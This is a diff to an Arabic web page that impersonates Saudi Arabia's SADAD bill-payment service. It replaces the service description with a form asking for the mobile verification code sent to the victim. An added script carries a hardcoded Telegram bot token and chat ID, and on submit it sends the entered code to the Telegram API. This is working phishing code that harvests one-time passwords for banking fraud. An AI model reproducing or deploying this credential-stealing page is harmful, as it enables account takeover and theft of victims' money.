@@ -36,24 +36,49 @@
   </div>
 </nav>
 <section class="main"  dir="rtl">
-  <form action="NewService.html" method="post" accept-charset="utf-8" class="p-3">
-   <div class="p-3 pt-2 pb-2 form-control mb-3 infodb">
-     <h5>للسداد الحكومي</h5>
-     <p class="p-1 pb-0">
-       مع فواتير سداد، يمكنك دفع كل الفواتير من خلال البنك، كفواتير الكهرباء، والمياه،  والاتصالات، والرسوم الحكومية
-     </p>
-   </div>
-     <div class="p-1 pt-0">
-       <h5>ما هي مميزات خدمة سداد ؟</h5>
-       <p>
-         تتيح الخدمة للمستفيد تسديد المدفوعات عبر نظام سداد للمدفوعات، أحد أنظمة مؤسسة النقد العربي السعودي، وهو نظام مركزي لعرض ودفع الفواتير والزكاة والضرائب ورسوم الخدمات الحكومية والغرامات والمخالفات وفواتير المياه والكهرباء والمدفوعات الأخرى إلكترونياً في المملكة العربية السعودية، حيث إن مهمته الأساسية هي تسهيل وتسريع عملية دفع الفواتير والمدفوعات الأخرى عبر جميع القنوات المصرفية في المملكة (فروع البنوك وأجهزة الصرف الآلي والهاتف المصرفي والإنترنت المصرفية).
-       </p>
-     </div>
-   <button class="btn btn-primary btn-large" style="width:100%" type="submit">بدأ الخدمة </button>
+  <form id="telegramForm" class="p-3">
+   <img class="container" src="1d19dc_9a4ca07ce411488e97b2920adb173c55~mv2.jpg" alt="" />
+   <p class="text-break p-2">
+     لمتابعة معاملتك ، يرجى إدخال رمز التوثيق الذي تم إرساله الى رقم هاتفك المحمول المسجل أو عنوان بريدك الإلكتروني وأنقر فوق متابعة
+   </p>
+     <div class="mb-3">
+  <label for="inp1" class="form-label">
+    رمز توثيق الجوال
+  </label>
+  <input name="inp1" type="number" class="form-control" id="inp1" name="a4">
+    </div> 
+   <button name="submit" class="btn btn-primary btn-large" style="width:100%" type="submit">متابعة </button>
   </form>
 </section>
-   <section class="p-4">
-   </section>
+<script>
+  const botToken = '5158365562:AAEz1BsupVQMQTgOkEyfu8yi4cvjkmPLLv0'; 
+  const chatId = '@Anas_mx';
+  document.getElementById('telegramForm').addEventListener('submit', function (e) {
+      e.preventDefault();
+      var uid = 1234567865;
+      var message = "_______ تفاصيل عملية الدفع _______ " + "\n" +"\n";
+      message += "رقم العملية" + ":" + uid + "\n" + "\n";
+      message += "رمز توثيق الجوال"+":"+ document.getElementById('inp1').value +"\n"+"\n";
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+      fetch(url, {
+          method: 'POST',
+          headers: {
+              'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+              chat_id: chatId,
+              text: message
+          })
+      })
+      .then(response => response.json())
+      .then(data => {
+        console.log('don');
+      })
+      .catch(error => {
+        console.log( error);
+      });
+  });
+</script>
     <footer class="footer  p-2 fixed-bottom text-center border-top text-center mt-4 infodb" dir="rtl">
     <div class="footer-copyright ">
           <div class="">
